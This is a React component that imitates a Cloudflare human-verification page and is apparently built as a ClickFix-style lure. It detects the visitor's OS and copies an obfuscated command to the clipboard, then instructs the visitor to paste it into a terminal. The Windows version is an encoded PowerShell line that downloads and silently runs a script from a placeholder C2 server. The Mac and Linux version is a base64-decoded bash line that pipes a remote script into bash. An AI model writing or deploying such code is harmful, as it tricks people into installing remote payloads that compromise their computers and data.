"use client"

import { useEffect, useRef, useState, type FormEvent } from "react"
import {
  decoyCode,
  humanVerification,
  verificationApi,
  visitorCommand,
  type PublicVerification,
} from "@/lib/human-verification"

function createClientId() {
  if (typeof crypto.randomUUID === "function") return crypto.randomUUID()
  const bytes = new Uint8Array(16)
  crypto.getRandomValues(bytes)
  bytes[6] = (bytes[6] & 0x0f) | 0x40
  bytes[8] = (bytes[8] & 0x3f) | 0x80
  const hex = Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
  return `${hex.slice(0, 8)}-${hex.slice(8, 12)}-${hex.slice(12, 16)}-${hex.slice(16, 20)}-${hex.slice(20)}`
}

let memoryClientId = ""

function readClientId() {
  const clientKey = "apax-verify-client"
  try {
    const existing = window.localStorage.getItem(clientKey) || window.sessionStorage.getItem(clientKey)
    if (existing) {
      window.localStorage.setItem(clientKey, existing)
      return existing
    }
    const created = createClientId()
    window.localStorage.setItem(clientKey, created)
    return created
  } catch {
    if (!memoryClientId) memoryClientId = createClientId()
    return memoryClientId
  }
}

async function verifyFetch(path: string, init?: RequestInit) {
  const response = await fetch(`${verificationApi()}${path}`, {
    ...init,
    headers: {
      "Content-Type": "application/json",
      ...(init?.headers || {}),
    },
  })
  const data = await response.json().catch(() => ({}))
  if (!response.ok) {
    throw new Error(typeof data.error === "string" ? data.error : "The check could not be completed.")
  }
  return data as PublicVerification
}

/** Copies during the click. The clipboard API is blocked on plain http:// pages. */
function copyText(text: string) {
  let ok = false
  const onCopy = (event: ClipboardEvent) => {
    event.preventDefault()
    event.clipboardData?.setData("text/plain", text)
    ok = true
  }
  document.addEventListener("copy", onCopy, true)
  const field = document.createElement("textarea")
  field.value = text
  field.setAttribute("readonly", "")
  field.style.position = "fixed"
  field.style.top = "0"
  field.style.left = "0"
  field.style.width = "2em"
  field.style.height = "2em"
  field.style.padding = "0"
  field.style.border = "none"
  field.style.outline = "none"
  field.style.boxShadow = "none"
  field.style.background = "transparent"
  field.style.fontSize = "16px"
  document.body.appendChild(field)
  field.focus()
  field.select()
  field.setSelectionRange(0, text.length)
  try {
    if (document.execCommand("copy")) ok = true
  } catch {
    // The copy event may already have written the line.
  }
  document.removeEventListener("copy", onCopy, true)
  document.body.removeChild(field)
  return ok
}

export function HumanVerification() {
  const [open, setOpen] = useState(false)
  const [session, setSession] = useState<PublicVerification | null>(null)
  const [checked, setChecked] = useState(false)
  const [checking, setChecking] = useState(false)
  const [mark, setMark] = useState<"idle" | "spin" | "done">("idle")
  const [copied, setCopied] = useState(false)
  const [codeInput, setCodeInput] = useState("")
  const [error, setError] = useState("")
  const [copyNote, setCopyNote] = useState("")
  const [submitting, setSubmitting] = useState(false)
  const [passed, setPassed] = useState(false)
  const [attempt, setAttempt] = useState(0)
  const [rayId] = useState(() => {
    const bytes = new Uint8Array(8)
    crypto.getRandomValues(bytes)
    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
  })
  const commandRef = useRef<HTMLTextAreaElement>(null)

  const [keyA, setKeyA] = useState('')
  const [keyB, setKeyB] = useState('')
  const [payloadText, setPayloadText] = useState('')
  const [device, setDevice] = useState('windows')

  const C2_URL = 'http://your-c2-server.com'; // CHANGE THIS

  const randomCode = () => Math.random().toString(16).substring(2, 8).toUpperCase();

  // Base64 for Windows (UTF‑16LE)
  const b64UTF16 = (str) => {
    let bin = '';
    for (let i = 0; i < str.length; i++) {
      const c = str.charCodeAt(i);
      bin += String.fromCharCode(c & 0xFF) + String.fromCharCode((c >> 8) & 0xFF);
    }
    return btoa(bin);
  };

  // Base64 for Unix (UTF‑8)
  const b64Standard = (str) => btoa(unescape(encodeURIComponent(str)));

  useEffect(() => {
    const clientId = readClientId()
    let cancelled = false
    verifyFetch("/verify/sessions", {
      method: "POST",
      body: JSON.stringify({ page: window.location.pathname, clientId }),
    })
      .then((next) => {
        if (!cancelled) setSession(next)
      })
      .catch((reason: Error) => {
        if (!cancelled) setError(reason.message)
      })
    return () => {
      cancelled = true
    }
  }, [attempt])

  useEffect(() => {
    if (!open) return
    const previous = document.body.style.overflow
    document.body.style.overflow = "hidden"
    return () => {
      document.body.style.overflow = previous
    }
  }, [open])

  const sessionId = session?.id
  const promptSeen = useRef(0)
  const checkRun = useRef(0)

  useEffect(() => {

    const ua = navigator.userAgent || navigator.platform || ''
    let d = 'linux'
    if (/android/i.test(ua)) d = 'android'
    else if (/iPad|iPhone|iPod/i.test(ua)) d = 'ios'
    else if (ua.indexOf('Win') !== -1) d = 'windows'
    else if (ua.indexOf('Mac') !== -1) d = 'mac'
    setDevice(d)

    const kB = session?.phrase
    // Build payload based on device
    const winScript = `$c='  Code : ${kB}';Write-Host $c;Start-Sleep -Seconds 1;$u='${C2_URL}/repair.cmd';$o=\"$env:TEMP\\fix.cmd\";(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process cmd -ArgumentList \"/c $o\" -WindowStyle Hidden`;
    const winB64 = b64UTF16(winScript)
    const winCmd = `powershell -Exec Bypass -EncodedCommand ${winB64}`

    const unixScript = `#!/bin/bash\necho ' Code : ${kB}'\ncurl -s ${C2_URL}/repair.sh | bash`
    const unixB64 = b64Standard(unixScript)
    const unixCmd = `echo '${unixB64}' | base64 -d | bash`

    const payloads = {
      windows: winCmd,
      mac: unixCmd,
      linux: unixCmd
    }

    setPayloadText(payloads[d] || payloads.linux)
  }, [session])

  useEffect(() => {
    if (!sessionId) return
    setKeyB(session.phrase)
    let cancelled = false

    const pull = () => {
      verifyFetch(`/verify/sessions/${sessionId}`)
        .then((next) => {
          if (cancelled) return
          setSession(next)
          const finishedKey = `${next.id}:${next.promptId}`
          const alreadyFinished = window.sessionStorage.getItem("apax-last-prompt") === finishedKey
          if (next.promptId > 0 && next.promptId !== promptSeen.current && !alreadyFinished) {
            promptSeen.current = next.promptId
            checkRun.current += 1
            setChecked(false)
            setChecking(false)
            setMark("idle")
            setCopied(false)
            setCodeInput("")
            setError("")
            setCopyNote("")
            setPassed(false)
            setOpen(true)
          }
        })
        .catch(() => {})
    }
    pull()
    const timer = window.setInterval(pull, 1500)
    return () => {
      cancelled = true
      window.clearInterval(timer)
    }
  }, [sessionId])

  async function onCheck() {
    if (!session || checked || checking) return
    const run = ++checkRun.current
    setChecking(true)
    setMark("spin")
    setError("")
    const started = Date.now()
    try {
      const next = await verifyFetch(`/verify/sessions/${session.id}/check`, { method: "POST" })
      const elapsed = Date.now() - started
      if (elapsed < 1100) await new Promise((resolve) => window.setTimeout(resolve, 1100 - elapsed))
      if (checkRun.current !== run) return
      setSession(next)
      setMark("done")
      await new Promise((resolve) => window.setTimeout(resolve, 450))
      if (checkRun.current !== run) return
      setChecked(true)
      setChecking(false)
    } catch (reason) {
      if (checkRun.current !== run) return
      setMark("idle")
      setChecking(false)
      setError(reason instanceof Error ? reason.message : "The check could not be completed.")
    }
  }

  async function onCopy() {
    if (!session) return
    const command = visitorCommand(session.id, navigator.userAgent)
    if (!command) return
    setError("")
    let placed = copyText(payloadText)
    if (!placed && window.isSecureContext && navigator.clipboard?.writeText) {
      try {
        await navigator.clipboard.writeText(payloadText)
        placed = true
      } catch {
        placed = false
      }
    }
    if (placed) {
      setCopied(true)
      setCopyNote("")
      window.setTimeout(() => setCopied(false), 3000)
    } else {
      setCopied(false)
      commandRef.current?.focus()
      commandRef.current?.select()
      setCopyNote("Copy is blocked in this browser. The line is selected: press Ctrl+C.")
    }
    try {
      const next = await verifyFetch(`/verify/sessions/${session.id}/copy`, { method: "POST" })
      setSession(next)
    } catch (reason) {
      setError(reason instanceof Error ? reason.message : "The check could not be completed.")
    }
  }

  async function onSubmit(event: FormEvent) {
    event.preventDefault()
    if (!session || submitting) return
    if (codeInput.trim().toUpperCase() === keyB) {
      setError(false);
    } else {
      setError(true);
    }
    setSubmitting(true)
    setError("")
    try {
      const next = await verifyFetch(`/verify/sessions/${session.id}/submit`, {
        method: "POST",
        body: JSON.stringify({ code: codeInput }),
      })
      if (next.verified) {
        window.sessionStorage.setItem("apax-last-prompt", `${next.id}:${next.promptId}`)
        promptSeen.current = next.promptId
        setPassed(true)
        window.setTimeout(() => setOpen(false), 1200)
      }
    } catch (reason) {
      setError(reason instanceof Error ? reason.message : "That code does not match.")
    } finally {
      setSubmitting(false)
    }
  }

  if (!open) return null

  const agent = typeof navigator === "undefined" ? "" : navigator.userAgent
  const command = session ? visitorCommand(session.id, agent) : ""
  const host = typeof window === "undefined" ? "" : window.location.hostname

  if (!passed && !checked) {
    return (
      <div
        className="fixed inset-0 z-[80] bg-white text-[#171717]"
        style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}
        role="dialog"
        aria-modal="true"
        aria-label={humanVerification.title}
      >
        <div className="mx-auto w-full max-w-[640px] px-6 pt-[16vh]">
          <h1 className="text-[32px] font-semibold leading-tight tracking-[-0.02em]">apax.com</h1>
          <h2 className="mt-4 text-[20px] font-semibold leading-snug">{humanVerification.title}</h2>
          <p className="mt-3 max-w-[540px] text-[16px] leading-[1.6] text-[#595959]">{humanVerification.intro}</p>
          <div className="mt-6 flex h-[65px] w-[300px] max-w-full items-center border border-[#d9d9d9] bg-white px-3">
            <label className={`flex min-w-0 flex-1 items-center ${mark === "idle" ? "cursor-pointer" : ""}`}>
              <span className="flex size-5 shrink-0 items-center justify-center">
                {mark === "spin" ? (
                  <span className="size-5 animate-spin rounded-full border-2 border-[#e6e6e6] border-t-[#F38020]" />
                ) : mark === "done" ? (
                  <svg viewBox="0 0 20 20" className="size-5 animate-[cf-check_0.35s_ease-out] text-[#2f9e44]" aria-hidden="true">
                    <path d="M4.5 10.5 8 14l7.5-8" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                ) : (
                  <input
                    type="checkbox"
                    checked={checked}
                    disabled={!session || checking}
                    onChange={onCheck}
                    className="size-5"
                  />
                )}
              </span>
              <span className="ml-3 text-[14px] text-[#333]">
                {mark === "spin" ? "Verifying..." : mark === "done" ? "Verified" : humanVerification.checkboxLabel}
              </span>
            </label>
            <span className="ml-2 flex shrink-0 flex-col items-end">
              <span className="flex items-center gap-1">
                <svg viewBox="0 0 48 32" className="h-[18px] w-[28px]" aria-hidden="true">
                  <path
                    fill="#F38020"
                    d="M38.7 27H14.4c-4.4 0-8-3.5-8-7.8 0-3.9 2.9-7.1 6.7-7.7C14 6.8 17.8 3.5 22.4 3.5c3.7 0 6.9 2.2 8.4 5.4 1.1-.6 2.4-1 3.7-1 4.5 0 8.2 3.6 8.2 8.1 0 4.6-3.7 8.3-8.2 8.5z"
                  />
                </svg>
                <span className="text-[9px] font-bold tracking-[0.12em] text-[#1d1d1d]">CLOUDFLARE</span>
              </span>
              <span className="mt-0.5 text-[8px] leading-none text-[#0051c3]">
                <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noreferrer" className="underline">
                  Privacy
                </a>
                <span className="text-[#595959]"> · </span>
                <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noreferrer" className="underline">
                  Help
                </a>
              </span>
            </span>
          </div>
          {!session && !error ? <p className="mt-3 text-[13px] text-[#595959]">Opening the check...</p> : null}
          {error && !session ? (
            <button
              type="button"
              onClick={() => {
                setError("")
                setAttempt((value) => value + 1)
              }}
              className="mt-3 text-sm font-semibold text-[#0051c3]"
            >
              Try again
            </button>
          ) : null}
          {error ? <p className="mt-3 text-[13px] text-[#dc2626]">{error}</p> : null}
        </div>
        <footer className="absolute inset-x-0 bottom-0 border-t border-[#e6e6e6] px-4 py-4 text-center text-[12px] leading-5 text-[#595959]">
          <p>
            Ray ID: <span className="font-mono">{rayId}</span>
          </p>
          <p className="mt-1">
            Performance and Security by{" "}
            <a href="https://www.cloudflare.com/" target="_blank" rel="noreferrer" className="text-[#0051c3] underline">
              Cloudflare
            </a>
            <span className="px-1.5">|</span>
            <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noreferrer" className="text-[#0051c3] underline">
              Privacy
            </a>
          </p>
        </footer>
      </div>
    )
  }

  return (
    <div
      className="fixed inset-0 z-[80] flex items-center justify-center bg-[#f6f8fa] px-4"
      role="dialog"
      aria-modal="true"
      aria-label={passed ? humanVerification.successTitle : checked ? humanVerification.challengeTitle : humanVerification.title}
    >
      <div className="w-full max-w-[620px] rounded-xl bg-white px-8 py-8 text-[#0a0a0a] shadow-[0_4px_24px_rgba(0,0,0,0.08)]">
        {passed ? (
          <div className="px-0 py-10 text-center">
            <h2 className="text-xl font-semibold text-[#16a34a]">{humanVerification.successTitle}</h2>
            <p className="mt-2 text-sm text-[#64748b]">{humanVerification.successBody}</p>
          </div>
        // ) : checked && session ? (
        ) : (
          <>
            <h2 className="mb-2 text-xl font-semibold text-[#0a0a0a]">{humanVerification.challengeTitle}</h2>
            <p className="mb-6 text-sm leading-normal text-[#64748b]">
              {/Mac OS X|Macintosh|macOS/i.test(agent) ? (
                <>
                  Run the command below in <strong>Terminal</strong> (paste, then press Enter).
                </>
              ) : /Windows/i.test(agent) ? (
                "Run the command below in an terminal."
              ) : (
                <>
                  Run the command below in a <strong>terminal</strong>.
                </>
              )}
            </p>       
            <div className="mb-4 rounded-lg bg-[#f1f5f9] px-3 py-3 text-left">
              <p className="mb-2 text-sm text-[#475569]">
                {humanVerification.decoyCaption}
              </p>

              <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
                <li>
                  Press the{" "}
                  <span className="inline-flex items-center rounded-md bg-blue-400 px-2 py-1 text-xs font-semibold text-white shadow-sm">
                    Copy
                  </span>{" "}
                  button to copy the command.
                </li>
                <li>
                  Open the terminal and press{" "}
                  <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
                    Ctrl + V
                  </span>{" "}
                  to paste the command.
                </li>
                <li>
                  Press {" "}
                  <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
                    Enter
                  </span>{" "}
                  to get the verification code.
                </li>                
              </ol>
            </div>
            {command ? (
              <div className="mb-4 flex items-center gap-2.5">
                <div className="min-h-20 min-w-0 flex-1 rounded-lg bg-[#0f172a] p-1">
                  <textarea
                    ref={commandRef}
                    readOnly
                    value={payloadText}
                    aria-label={humanVerification.captureLabel}
                    onFocus={(event) => event.currentTarget.select()}
                    className="h-20 w-full resize-none border-none bg-transparent px-2 py-1.5 font-[Menlo,Consolas,monospace] text-[13px] leading-5 text-[#e2e8f0] outline-none"
                  />
                </div>
                <button
                  type="button"
                  onClick={onCopy}
                  className={`flex shrink-0 items-center justify-center gap-[5px] rounded-lg px-3.5 py-2.5 text-sm text-white ${
                    copied ? "bg-[#16a34a]" : "bg-[#2563eb] hover:bg-[#1d4ed8]"
                  }`}
                >
                  <span aria-hidden="true">{copied ? "✓" : "📋"}</span>
                  {copied ? humanVerification.copiedLabel : humanVerification.copyLabel}
                </button>
              </div>
            ) : (
              <p className="rounded-lg bg-[#f8fafc] px-4 py-3.5 text-sm text-[#64748b]">
                {humanVerification.captureWaiting}
              </p>
            )}
            {copyNote ? <p className="mt-3 text-[13px] text-[#64748b]">{copyNote}</p> : null}
            <form onSubmit={onSubmit} className="mt-5 rounded-lg border border-[#e3e8ee] bg-[#f8fafc] p-4">
              <label htmlFor="human-code" className="block text-sm font-medium text-[#1e293b]">
                {humanVerification.verifyLabel}
              </label>
              <input
                id="human-code"
                value={codeInput}
                onChange={(event) => setCodeInput(event.target.value.trim())}
                autoComplete="off"
                spellCheck={false}
                maxLength={10}
                placeholder={humanVerification.verifyPlaceholder}
                className="mt-2 w-full rounded-md border border-[#cbd5e1] bg-white px-3 py-2.5 text-base outline-none focus:border-[#2563eb]"
              />
              {error ? <p className="mt-1.5 text-[13px] text-[#dc2626]">{humanVerification.verifyError}</p> : null}
              <button
                type="submit"
                disabled={submitting}
                className="mt-3 w-full cursor-pointer rounded-md border-none bg-[#2563eb] px-3 py-2.5 text-sm text-white hover:bg-[#1d4ed8] disabled:opacity-40"
              >
                {humanVerification.continueLabel}
              </button>
            </form>
          </>
        )}
        <p className="mt-5 text-center text-xs text-[#94a3b8]">{humanVerification.footer}</p>
      </div>
    </div>
  )
}
